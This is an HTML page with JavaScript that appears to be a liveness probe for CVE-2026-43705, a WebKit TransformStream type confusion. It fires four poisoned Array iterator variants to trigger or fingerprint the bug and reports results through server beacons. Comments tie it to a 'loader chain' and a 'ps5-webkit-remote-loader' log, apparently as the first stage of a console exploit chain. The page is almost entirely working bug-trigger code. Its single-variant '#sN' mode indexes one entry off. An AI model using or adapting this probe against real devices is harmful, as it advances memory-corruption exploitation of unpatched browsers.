  <!-- LIVENESS-FIRST (spawner2 2026-10-15): synchronous L/A/B beacons (4 variants incl.
       the SAFE over-yield one) run before the loader chain. Restore: cp index.loader-backup.html index.html -->
  <pre id="out">CVE-2026-43705 liveness test — 3 crash-isolated variants
</pre>
<script>
/*
 * CVE-2026-43705 liveness probe v2 (spawner2, 2026-10-15)
 * WebCore TransformStream type confusion when Array.prototype[Symbol.iterator]
 * is overridden (WebKit bug 314528; fix commit 8fd92b1, ~2026-06-30).
 *
 * Pure WebCore JS: no persistence, no filesystem, no syscalls. A crash only
 * takes down this web process, so the server-side beacon log is ground truth.
 *
 * Beacon protocol (all synchronous same-origin POSTs to /beacon/<stage>/<run>):
 *   L            page executed at all
 *   U            TransformStream is not a global (unsupported webview)
 *   A0/B0        variant 0 (OVER-YIELD: 3 values + 1 extra) — SAFE discriminator,
 *                does NOT crash: pre-fix returns => "ctorThrew=none" = BUG LIVE;
 *                post-fix => TypeError (size check).  [leg43705-static P1]
 *   A1/B1        variant 1 (plain-object substitution)  start / survived
 *   A2/B2        variant 2 (stream-shaped object reference)
 *   A3/B3        variant 3 (truncated 3-array -> 2 values)
 *
 * Reading the log (server side):
 *   B0 with ctorThrew=none        -> SAFE proof the bug is live (no crash needed)
 *   B0 with ctorThrew=TypeError   -> size guard present => fix marker
 *   L then A<n> with NO B<n>      -> that variant crashed the engine => BUG LIVE
 *   L, A<n>, B<n> for n=1,2,3 all -> no crash in any variant => FIXED or not triggered
 *   B<n> with ctorThrew=TypeError -> runtime guard present => fix marker
 *   U only                        -> TransformStream absent (no verdict)
 *
 * Reload with #s1 / #s2 / #s3 to re-run ONLY that variant (useful after a crash).
 */
(function () {
  "use strict";
  var out = document.getElementById("out");
  function say(s) { try { out.textContent += s + "\n"; } catch (e) {} }

  // Unique run id, visible server-side in every beacon PATH (wire signature).
  var run = "r" + Date.now().toString(36) + "-" +
            Math.random().toString(36).slice(2, 8);

  // Crash-safe beacon: a synchronous XHR is fully sent before execution
  // continues, so A cannot be lost and "A with no B" is unambiguous.
  function beacon(stage, body) {
    try {
      var x = new XMLHttpRequest();
      x.open("POST", "/beacon/" + stage + "/" + run, false);
      x.setRequestHeader("Content-Type", "text/plain;charset=utf-8");
      x.send(body || "");
    } catch (e) { /* logging must never throw */ }
  }

  say("run=" + run);
  say("UA=" + navigator.userAgent);
  beacon("L", "page loaded; ua=" + navigator.userAgent);

  if (typeof TransformStream === "undefined") {
    beacon("U", "TransformStream undefined; ua=" + navigator.userAgent);
    say("UNSUPPORTED: TransformStream is not a global");
    return;
  }

  // ---- poisoned iterators -------------------------------------------------
  // createInternalTransformStreamFromTransformer returns
  //   [internalTransformStream, readable, writable]
  // and the C++ side consumes it through the JS iteration protocol. Each
  // variant substitutes a different kind of wrong value for slots 1..2.
  function iterOverYield() {            // v0: SAFE — 3 values + 1 extra value
    return function () {
      var arr = this, i = 0;
      var n = (arr.length === 3) ? 4 : arr.length;
      return { next: function () {
        if (i >= n) return { done: true };
        var val = (i < arr.length) ? arr[i] : {};   // extra 4th value
        i++;
        return { value: val, done: false };
      }};
    };
  }
  function iterPlainObject() {           // v1: plain object slot
    return function () {
      var arr = this, i = 0;
      return { next: function () {
        if (i >= arr.length) return { done: true };
        var val = arr[i];
        if (arr.length === 3 && i >= 1) val = { fake: true };
        i++;
        return { value: val, done: false };
      }};
    };
  }
  function iterStreamShaped() {          // v2: stream-shaped object reference
    return function () {
      var arr = this, i = 0;
      return { next: function () {
        if (i >= arr.length) return { done: true };
        var val = arr[i];
        if (arr.length === 3 && i >= 1) {
          val = { locked: false, getReader: function () {}, tee: function () {},
                  cancel: function () {}, pipeThrough: function () {},
                  pipeTo: function () {} };
        }
        i++;
        return { value: val, done: false };
      }};
    };
  }
  function iterTruncated() {             // v3: report only 2 of 3 values
    return function () {
      var arr = this, i = 0;
      var n = (arr.length === 3) ? 2 : arr.length;
      return { next: function () {
        if (i >= n) return { done: true };
        var val = arr[i]; i++;
        return { value: val, done: false };
      }};
    };
  }

  function runStage(n, desc, makeIter) {
    beacon("A" + n, "start variant " + n + " (" + desc + "); ua=" + navigator.userAgent);
    say("variant " + n + " (" + desc + ") running...");
    var threw = null;
    var orig = Array.prototype[Symbol.iterator];
    try {
      Array.prototype[Symbol.iterator] = makeIter();
      try {
        var ts = new TransformStream();
        // Force the later vtable call the advisory describes.
        try { var r = ts.readable, w = ts.writable; } catch (e2) {}
      } catch (e) {
        threw = (e && e.name) ? (e.name + '|' + String(e.message || '').slice(0, 120)) : String(e);
      }
    } catch (e3) {
      threw = threw || ((e3 && e3.name) ? (e3.name + '|' + String(e3.message || '').slice(0, 120)) : String(e3));
    } finally {
      Array.prototype[Symbol.iterator] = orig;   // skipped only if we crashed
    }
    // BEACON B — separate request issued AFTER the trigger; only reached if the
    // trigger did not crash the process.
    beacon("B" + n, "survived; ctorThrew=" + (threw || "none"));
    say("variant " + n + " SURVIVED ctorThrew=" + (threw || "none"));
    return true;
  }

  var stages = [
    [0, "over-yield (+1 extra value, SAFE)", iterOverYield],
    [1, "plain-object substitution", iterPlainObject],
    [2, "stream-shaped object reference", iterStreamShaped],
    [3, "truncated (3 values -> 2)", iterTruncated]
  ];

  var only = (location.hash || "").replace(/^#s?/, "");
  if (only === "0" || only === "1" || only === "2" || only === "3") {
    var one = stages[Number(only) - 1];
    say("single-variant mode: #s" + only);
    runStage(one[0], one[1], one[2]);
  } else {
    for (var i = 0; i < stages.length; i++) {
      if (!runStage(stages[i][0], stages[i][1], stages[i][2])) break;
    }
  }

  // Summary hint for whoever is looking at the console screen.
  say("");
  say("done. verdict is server-side: ps5-webkit-remote-loader/host-beacons.log");
  say("B0 none=BUG LIVE (safe) | A<n> without B<n>=crash=bug live | reload #s0..#s3 per variant.");
})();
</script>
